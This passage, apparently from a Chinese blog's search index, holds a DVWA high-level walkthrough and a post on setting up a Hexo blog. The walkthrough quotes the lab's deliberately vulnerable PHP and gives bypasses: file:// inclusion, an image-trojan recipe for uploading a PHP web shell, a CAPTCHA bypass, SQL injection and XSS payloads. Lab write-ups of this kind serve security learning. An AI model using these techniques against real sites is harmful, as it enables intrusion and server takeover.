我们可以利用file协议绕过，当浏览器访问一个本地的文件时，封装的协议就是file://构造url：http://localhost:8888/dvwa/vulnerabilities/fi/?page=file:///D:\\phpStudy\\WWW\\phpinfo.phppage后面跟的参数为想要访问的文件的绝对路径 File Upload文件上传 核心代码： &lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) &#123; // 文件上传路径 $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); // 文件信息 $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; $uploaded_tmp = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ]; // 检查是否为img if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // 文件夹是否能移动到新位置 if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; // 不能 echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; &#125; else &#123; // 可以 echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // 图片不是Img时 echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;; &#125; &#125; ?&gt; getimagesize() 函数用于获取图像大小及相关信息 每种格式的图片都会有各种的特征，getimagesize函数就是用于检查上传的图片是否有规定的特征 然而上传的jpg和png文件不像gif那样，直接在最前面添加一个gif89a就能绕过，所以我们需要制作一个图片木马 制作方法： cmd输入:copy 图片.jpg&#x2F;b+木马.php&#x2F;a 图片木马.jpg 将图片.jpg和木马.php合并并保存为图片木马.jpg 上传到服务器之后用菜刀之类的工具连接 Insecure CAPTCHA不安全的验证码 核心代码： &lt;?php if( isset( $_POST[ &#39;Change&#39; ] ) ) &#123; // 隐藏CAPTCHA窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // 从第三方获取验证码 $resp = recaptcha_check_answer( $_DVWA[ &#39;recaptcha_private_key&#39; ], $_POST[&#39;g-recaptcha-response&#39;] ); if ( $resp || ( $_POST[ &#39;g-recaptcha-response&#39; ] == &#39;hidd3n_valu3&#39; &amp;&amp; $_SERVER[ &#39;HTTP_USER_AGENT&#39; ] == &#39;reCAPTCHA&#39; ) )&#123; // 验证成功，检查两次输入的密码是否一致 if ($pass_new == $pass_conf) &#123; $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); // 反馈给用户 echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // 密码不匹配 $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; &#125; &#125; else &#123; // 验证码验证失败 $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; // 生成Anti-CSRF token generateSessionToken(); ?&gt; 验证的逻辑就是当参数recaptcha_response_field不等于hidd3n_valu3或者http包头的User-Agent参数不等于reCAPTCHA时，认为输入错误 直接用bp抓包，将User-Agent值改为于reCAPTCHA，并在参数栏里加一个recaptcha_response_field&#x3D;hidd3n_valu3即可 SQL Injectionsql注入 核心代码： &lt;?php if( isset( $_SESSION [ &#39;id&#39; ] ) ) &#123; // 获取输入的值 $id = $_SESSION[ &#39;id&#39; ]; // 连接数据库，并将查询的结果放入结果集中 $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#39; ); // 获取结果集 while( $row = mysqli_fetch_assoc( $result ) ) &#123; // 获取值 $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // 反馈给用户 echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; 服务器在查询数据时加入了LIMIT 1，只输出一条结果 由于没有过滤注释符，所以只要在参数后面加一个#就可以绕过，或者是将or前面的值改为0，即查不到这个id，那服务器就会把or后面的值作为输出 high级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。 SQL Injection (Blind)sql盲注 核心代码： &lt;?php if( isset( $_COOKIE[ &#39;id&#39; ] ) ) &#123; // 获取输入的值 $id = $_COOKIE[ &#39;id&#39; ]; // 连接数据库，并将查询的结果放入结果集中 $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // 获取结果集 $num = @mysqli_num_rows( $result ); if( $num &gt; 0 ) &#123; // 反馈给用户 echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; &#125; else &#123; // 打乱Sleep函数的沉睡时间 if( rand( 0, 5 ) == 3 ) &#123; sleep( rand( 2, 4 ) ); &#125; // 没有找到用户，返回错误 header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); // 反馈给用户 echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; 可以看到，服务器利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep，其结果是扰乱了时间盲注 既然时间盲注用不了，那就用布尔盲注就好 Weak Session IDs弱Session的id 核心代码： &lt;?php $html = &quot;&quot;; if ($_SERVER[&#39;REQUEST_METHOD&#39;] == &quot;POST&quot;) &#123; if (!isset ($_SESSION[&#39;last_session_id_high&#39;])) &#123; $_SESSION[&#39;last_session_id_high&#39;] = 0; &#125; $_SESSION[&#39;last_session_id_high&#39;]++; $cookie_value = md5($_SESSION[&#39;last_session_id_high&#39;]); setcookie(&quot;dvwaSession&quot;, $cookie_value, time()+3600, &quot;/vulnerabilities/weak_id/&quot;, $_SERVER[&#39;HTTP_HOST&#39;], false, false); &#125; ?&gt; 这里将cookie的值进行了md5打散，并且还设置了期限之类进一步增加SessionID的安全性，但不足的是进行md5散列的值是0的累加，只要收集大量的SessionID，把SessionID拿去md5解密之后就能找到其规律 之后的步骤同Low XSS (DOM)核心代码： &lt;?php // 检查是否输入了值 if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) &#123; # 设置白名单 switch ($_GET[&#39;default&#39;]) &#123; case &quot;French&quot;: case &quot;English&quot;: case &quot;German&quot;: case &quot;Spanish&quot;: # ok break; default: header (&quot;location: ?default=English&quot;); exit; &#125; &#125; ?&gt; 虽然设置了白名单，但是没有过滤注释符，跟medium一样，加入#就行http://localhost:8888/dvwa/vulnerabilities/xss_d/?default=English#default==English%20%3Cscript%3Ealert(/xss/)%3C/script%3E XSS (Reflected)反射型xss 核心代码： &lt;?php header (&quot;X-XSS-Protection: 0&quot;); // 检查是否输入了值 if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) &#123; // 获取输入的值 $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] ); // 反馈给用户 echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;; &#125; ?&gt; preg_replace函数执行一个正则表达式的搜索和替换 服务器加入了黑名单过滤输入，防御了双写和大小写绕过 虽然无法使用&lt;script&gt;标签注入XSS代码，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。输入&lt;img src=1 onerror=alert(/xss/)&gt;即可弹窗 XSS (Stored)存储型xss 核心代码： &lt;?php if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123; // 获取输入的值 $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); $name = trim( $_POST[ &#39;txtName&#39; ] ); // 净化输入的信息 $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // 净化输入的名称 $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 更新数据库 $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); //mysql_close(); &#125; ?&gt; 跟反射型一样，虽然用正则表达式过滤了&lt;script&gt;标签，但是没有img、iframe等其它标签 用bp抓包，改name的参数为&lt;img src=1 onerror=alert(1)&gt;即可弹窗","categories":[{"name":"web安全","slug":"web安全","permalink":"https://perfect-time.xyz/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"dvwa","slug":"dvwa","permalink":"https://perfect-time.xyz/tags/dvwa/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://perfect-time.xyz/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"搭博客过程中遇到的一些问题","slug":"problem","date":"2018-07-05T04:58:32.000Z","updated":"2023-08-09T20:40:21.275Z","comments":true,"path":"2018/07/05/problem/","link":"","permalink":"https://perfect-time.xyz/2018/07/05/problem/","excerpt":"求求你不要再404了.jpg","text":"求求你不要再404了.jpg 404搭建的过程中遇到过两次404的问题第一次是因为域名因为我的Github的用户名是a+qq号，最后出来的域名就很Low搭建的时候刚好在听perfect time这首歌，于是就决定作为我的项目名称建完之后访问perfect-time.github.io却怎么也访问不到一开始以为是没有绑定域名的缘故，花了3块钱在tx那里买了个xyz的域名，结果还是404最后重新建了一个项目，乖乖的填了自己的用户名才成功 第二次是发生在建完之后，hexo g -d之后突然又404了因为会出现404，所以连到Github的过程中没有问题能够本地运行，博客本身没有问题排查了半天之后发现是CNAME的缘故CNAM不能直接放在hexo目录下，要放到&#x2F;source这个目录里面Github只会上传&#x2F;source这个文件夹里面的更改，放在其他地方是没办法上传到服务器的上传不到服务器的结果就是Github域名解析不到博客的地址，但是在Dns这边是将博客地址转换成了域名地址，所以会出现404的情况总的来说就是一个粗心，本来一个下午就可以搞完的东西拖了两天才搞完 邮件联系方式中有邮件，想着以后说不定会有人发邮件给我，就把自己的邮件地址放了上去但是单单只放邮件地址会出现无事发生的情况网页的跳转肯定是以htpp协议封装的，邮件地址显然不认识http协议参考了学姐(大概)的博客，发现qq邮箱有一个邮我的功能，点开这个链接可以直接给我发邮件，这个功能很神奇尝试设置了一下之后发现根本跳转不到邮我的界面，肯定是链接出了什么问题这个问题还没解决 其他一些小问题版权声明在hexo目录下的_config文件中更改，就在最上面的Site和URL 文章摘要用&lt;!-- more --&gt;代码来实现，不用这个代码的话会把文章的内容全部显示在摘要里，而且不换行，特别难看 Markdown语法中，#后面必须跟着空格才能显示为标题，不然只会显示一个# 用了来必力的评论系统，本地运行是正常的，但是传到服务器上就不行了，原因不明 2018&#x2F;7&#x2F;7更新去掉了来必力的评论系统，看了几个博客之后发现好像Gitment比较受欢迎，就换成了Gitment系统 需要注意的是gitment_client_id和gitment_client_secret 在注册之后就会给你了 gitment_owner:填自己github账号 gitment_repo: 存储评论的库，按理说这个也可以另外再建一个库，不过我为了以防万一就直接用博客的库了 这个评论系统好像可以汉化，懒得弄了 2022&#x2F;7&#x2F;5更新时隔4年，昨晚睡不着通宵搞了一些东西，顺便把博客也复原一下复原的过程中遇到个非常麻烦的事情。hexo居然不支持新版本的node.js，其实解决方案很简单，直接把已经安装的node删除干净，再安装低版本的node即刻。全部搞定之后发现文章的时间全部乱了，都是变成了今天，删除了2022的目录之后还是不行。删除.deploy_git目录，并且在每个文章的抬头加上 date:日期即可。 2023&#x2F;8&#x2F;10更新在新电脑上又搞了次恢复，写一下恢复的方式，以便以后再做恢复 环境安装安装以下三个环境node.js git hexo npm install -g hexo-cli ##关联到github项目查看C:\\Users\\用户名.ssh下有无ssh文件夹，没有则创建 cd ~/. ssh ssh-keygen -t rsa -C &quot;1055883471@qq.com&quot; 打开用户目录，找到.ssh\\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key 测试是否成功 ssh -T git@github.com 配置用户名和邮箱 git config --global user.name &quot;perfect-time&quot; git config --global user.email &quot;1055883471@qq.com&quot; 关联到git项目 git init git remote add origin git@github.com:perfect-time/perfect-time.github.io.git ##浏览和提交生成并浏览 hexo g &amp;&amp; hexo s 提交进入”\\blog\\source_posts”,写完之后生成并浏览，没问题之后提交 hexo d 添加备份 git add . git commit -m &#39;modify&#39; git push origin hexo 持续更新中~","categories":[{"name":"其他","slug":"其他","permalink":"https://perfect-time.xyz/categories/%E5%85%B6%E4%BB%96/"}],"tags":[],"keywords":[{"name":"其他","slug":"其他","permalink":"https://perfect-time.xyz/categories/%E5%85%B6%E4%BB%96/"}]}]}